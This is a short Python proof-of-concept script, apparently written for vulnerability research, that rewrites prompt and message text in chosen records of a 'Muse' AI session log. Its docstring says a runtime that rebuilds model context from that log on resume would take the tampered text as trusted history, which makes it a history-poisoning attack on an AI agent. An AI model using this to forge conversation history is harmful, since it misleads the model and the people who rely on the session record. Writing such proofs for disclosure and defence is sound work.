#!/usr/bin/env python3
"""In-place rewrite of prompt/message text inside a Muse session log.

PoC for the history-poison channel: any same-UID process can rewrite
~/.local/share/muse/sessions/**/session.jsonl. If the runtime rebuilds model
context from this log on resume, the tampered text becomes trusted history.

Usage:
  python3 rewrite.py SESSION_DIR --seq N [--seq N ...] --find TEXT --replace TEXT
"""
import argparse
import json
import os
import sys


def rewrite_obj(obj, old, new, hits):
    if isinstance(obj, dict):
        return {k: rewrite_obj(v, old, new, hits) for k, v in obj.items()}
    if isinstance(obj, list):
        return [rewrite_obj(v, old, new, hits) for v in obj]
    if isinstance(obj, str) and old in obj:
        hits[0] += 1
        return obj.replace(old, new)
    return obj


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("session_dir")
    ap.add_argument("--seq", type=int, action="append", required=True)
    ap.add_argument("--find", required=True)
    ap.add_argument("--replace", required=True)
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    log_path = os.path.join(args.session_dir, "session.jsonl")
    if not os.path.isfile(log_path):
        print(f"error: {log_path} not found", file=sys.stderr)
        return 1

    out_lines = []
    total_hits = [0]
    changed = 0
    with open(log_path) as f:
        for line in f:
            raw = line.rstrip("\n")
            if not raw.strip():
                out_lines.append(line)
                continue
            try:
                o = json.loads(raw)
            except json.JSONDecodeError:
                out_lines.append(line)
                continue
            seq = o.get("sequence") if isinstance(o, dict) else None
            if seq in args.seq:
                o = rewrite_obj(o, args.find, args.replace, total_hits)
                out_lines.append(json.dumps(o, separators=(",", ":")) + "\n")
                changed += 1
            else:
                out_lines.append(line)

    if args.dry_run:
        print(f"would rewrite {changed} record(s), {total_hits[0]} text hit(s)")
        return 0
    with open(log_path, "w") as f:
        f.writelines(out_lines)
    os.chmod(log_path, 0o600)
    print(f"rewrote {changed} record(s), {total_hits[0]} text hit(s) -> {log_path}")
    return 0 if changed else 1


if __name__ == "__main__":
    sys.exit(main())
